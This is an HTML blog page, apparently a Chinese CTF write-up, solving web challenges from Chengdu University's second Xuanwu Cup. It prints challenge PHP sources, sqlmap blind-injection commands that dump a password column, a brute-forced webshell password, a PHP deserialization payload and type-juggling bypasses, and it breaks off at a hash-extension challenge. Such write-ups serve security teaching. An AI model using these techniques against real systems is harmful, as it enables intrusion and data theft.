@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="binLep">
+
+
+
+<meta name="description" content="最近好多招新赛鸭">
+<meta name="keywords" content="Event,玄武杯">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解">
+<meta property="og:url" content="http://binlep.github.io/2019/11/18/【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解/index.html">
+<meta property="og:site_name" content="binLep&#39;s Blog">
+<meta property="og:description" content="最近好多招新赛鸭">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-11-17T08:22:40.389Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解">
+<meta name="twitter:description" content="最近好多招新赛鸭">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="binLep&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="../../../../css/style.css">
+
+
+
+<link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解 | binLep&#39;s Blog</title>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdnjs.cloudflare.com/ajax/libs/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.10.4/jquery-ui.min.js", "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">binLep</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">图片托管在github，国内访问会很慢QWQ</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="../../../../index.html">主页</a></li>
+                        
+                            <li><a href="../../../../archives/">所有文章</a></li>
+                        
+                            <li><a href="../../../../tags/">标签云</a></li>
+                        
+                            <li><a href="../../../../about/">关于我</a></li>
+                        
+                            <li><a href="../../../../friends/">友情链接</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:1723569975@qq.com" title="Email"></a>
+                            
+                                <a class="fa RSS" href="../../../../atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/BugkuCTF/">BugkuCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/CryptixCTF/">CryptixCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Event/">Event</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Hackme-CTF/">Hackme CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Jarvis-OJ/">Jarvis OJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Linux-Pwn/">Linux Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/MOCTF/">MOCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Newark-Academy-CTF/">Newark Academy CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platform/">Platform</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platfrom/">Platfrom</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSCTF/">RSCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/XMan/">XMan</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/mipsel/">mipsel</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2libc/">ret2libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2shellcode/">ret2shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/xml注入/">xml注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/使用教程/">使用教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/安装教程/">安装教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/搭建Hexo/">搭建Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/攻防世界/">攻防世界</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/模板/">模板</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/玄武杯/">玄武杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/环境搭建/">环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/问题汇总/">问题汇总</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">Pwn路上的小萌新~</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">binLep</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">binLep</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">图片托管在github，国内访问会很慢QWQ</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="../../../../index.html">主页</a></li>
+                
+                    <li><a href="../../../../archives/">所有文章</a></li>
+                
+                    <li><a href="../../../../tags/">标签云</a></li>
+                
+                    <li><a href="../../../../about/">关于我</a></li>
+                
+                    <li><a href="../../../../friends/">友情链接</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:1723569975@qq.com" title="Email"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="../../../../atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="" class="article-date">
+      <time datetime="2019-11-17T16:17:00.000Z" itemprop="datePublished">2019-11-17</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="../../../../categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/Event/">Event</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/玄武杯/">玄武杯</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>最近好多招新赛鸭</p>
+<a id="more"></a>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>赛题地址：<a href="http://47.93.249.236:10006/" target="_blank" rel="noopener">http://47.93.249.236:10006/</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h3><p><strong>网页如下：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'p1'</span>] == <span class="string">''</span> <span class="keyword">or</span> $_GET[<span class="string">'p2'</span>] == <span class="string">''</span>) &#123;</span><br><span class="line">    header(<span class="string">'location: index.php?p1=CDUSEC&amp;p2=CTF'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line"><span class="keyword">print</span> $_GET[<span class="string">'p1'</span>];</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> $_GET[<span class="string">'p2'</span>];</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'p3'</span>] === <span class="string">'flag'</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>友好的入门 web 题，输入以下网址即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.93.249.236:10006/index.php?p1=CDUSEC&amp;p2=CTF?&amp;p3=flag</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;A~E4sy-pHp&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>赛题地址：<a href="http://47.93.249.236:10007" target="_blank" rel="noopener">http://47.93.249.236:10007</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution:"></a>Solution:</h3><p><strong>源码如下：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'p1'</span>] == <span class="string">''</span> <span class="keyword">or</span> $_GET[<span class="string">'p2'</span>] == <span class="string">''</span>) &#123;</span><br><span class="line">    header(<span class="string">'location: index.php?p1=CDUSEC&amp;p2=CTF'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line"><span class="keyword">print</span> $_GET[<span class="string">'p1'</span>];</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> $_GET[<span class="string">'p2'</span>];</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'p4'</span>] === <span class="string">'flag'</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里用 curl 命令也行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -d <span class="string">"p4=flag"</span> -vi <span class="string">"http://47.93.249.236:10007/index.php?p1=CDUSEC&amp;p2=CTF"</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Tw0~E4sy-pHp&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h2><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>赛题地址：<a href="http://47.93.249.236:10005/" target="_blank" rel="noopener">http://47.93.249.236:10005/</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution:"></a>Solution:</h3><p>御剑扫描出了<code>http://47.93.249.236:10005/robots.txt</code></p>
+<p>flag 就在这里面写着</p>
+<hr>
+<h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;BoBo-RoRo-ToTo&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="SQL-1"><a href="#SQL-1" class="headerlink" title="SQL-1"></a>SQL-1</h2><h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>解题地址：<a href="http://47.93.249.236:10001/" target="_blank" rel="noopener">http://47.93.249.236:10001/</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution:"></a>Solution:</h3><p>我只会 sqlmap ……</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://47.93.249.236:10001/index.php"</span> --data=<span class="string">"username=1&amp;password=1"</span> --technique T --time-sec 2 --current-db</span><br><span class="line">current database:    <span class="string">'mydb'</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://47.93.249.236:10001/index.php"</span> --data=<span class="string">"username=1&amp;password=1"</span> --technique T --time-sec 2 -D mydb --tables</span><br><span class="line">Database: mydb</span><br><span class="line">[1 table]</span><br><span class="line">+-------+</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://47.93.249.236:10001/index.php"</span> --data=<span class="string">"username=1&amp;password=1"</span> --technique T --time-sec 2 -D mydb -T users --columns</span><br><span class="line">Database: mydb</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | tinyint(4)  |</span><br><span class="line">| password | varchar(20) |</span><br><span class="line">| username | varchar(20) |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://47.93.249.236:10001/index.php"</span> --data=<span class="string">"username=1&amp;password=1"</span> --technique T --time-sec 2 -D mydb -T users -C password --dump</span><br><span class="line">Database: mydb</span><br><span class="line">Table: users</span><br><span class="line">[1 entry]</span><br><span class="line">+--------------------+</span><br><span class="line">| password           |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;sql1-wArn1ng&#125; |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sql1-wArn1ng&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="WeekPassword"><a href="#WeekPassword" class="headerlink" title="WeekPassword"></a>WeekPassword</h2><h3 id="Description-4"><a href="#Description-4" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>赛题地址：<a href="http://47.93.249.236:10002/" target="_blank" rel="noopener">http://47.93.249.236:10002/</a><br><br>科普：webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p>
+</blockquote>
+<hr>
+<h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution:"></a>Solution:</h3><p>用 BurpSuite 的 Intruder 爆破即可，密码是<code>000000</code></p>
+<hr>
+<h3 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Fine_WeBsH3ll&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="serialization-1"><a href="#serialization-1" class="headerlink" title="serialization-1"></a>serialization-1</h2><h3 id="Description-5"><a href="#Description-5" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>赛题地址：<a href="http://47.93.249.236:10009/index.php" target="_blank" rel="noopener">http://47.93.249.236:10009/index.php</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution:"></a>Solution:</h3><p>题目代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $a = <span class="string">'nothing'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;a != <span class="string">'nothing'</span>) &#123;</span><br><span class="line"></span><br><span class="line">            highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'No Flag!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化的题，随便构造一下就过去了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.93.249.236:10009/index.php?data=O:4:<span class="string">"Test"</span>:1:&#123;s:7:<span class="string">"%00Test%00a"</span>;s:1:<span class="string">"a"</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回显如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">'flag&#123;0030-0571-8890-4673&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0030-0571-8890-4673&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><h3 id="Description-6"><a href="#Description-6" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>赛题地址：<a href="http://47.93.249.236:10004/" target="_blank" rel="noopener">http://47.93.249.236:10004/</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution:"></a>Solution:</h3><p><strong>题目源码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">$f1 = @$_GET[<span class="string">'f1'</span>];</span><br><span class="line">$f2 = @$_POST[<span class="string">'f2'</span>];</span><br><span class="line">$f3 = @$_COOKIE[<span class="string">'f3'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($f2 !== <span class="string">'0'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'no'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>($f1 == <span class="number">0</span> <span class="keyword">and</span> $f1 !== <span class="number">0</span>) &#123;</span><br><span class="line">        $f2 == $f3;</span><br><span class="line">        <span class="keyword">if</span>(md5($f2) == <span class="number">0</span> <span class="keyword">and</span> $f2 == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接用 POST 方式传参<code>f2=0</code>即可绕过</p>
+<hr>
+<h3 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Due_to_weak_type:)&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="有趣的上传点"><a href="#有趣的上传点" class="headerlink" title="有趣的上传点"></a>有趣的上传点</h2><h3 id="Description-7"><a href="#Description-7" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>赛题地址：<a href="http://47.93.249.236:10003/" target="_blank" rel="noopener">http://47.93.249.236:10003/</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution:"></a>Solution:</h3><p>不会等 wp</p>
+<hr>
+<h3 id="Flag-7"><a href="#Flag-7" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>
+
+<h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><h3 id="Description-8"><a href="#Description-8" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>赛题地址：<a href="http://47.93.249.236:10008/" target="_blank" rel="noopener">http://47.93.249.236:10008/</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution:"></a>Solution:</h3><p>进去页面看源码发现有个<code>hint.php</code>，进去看到了源码，分析可知是哈希长度扩展攻击</p>
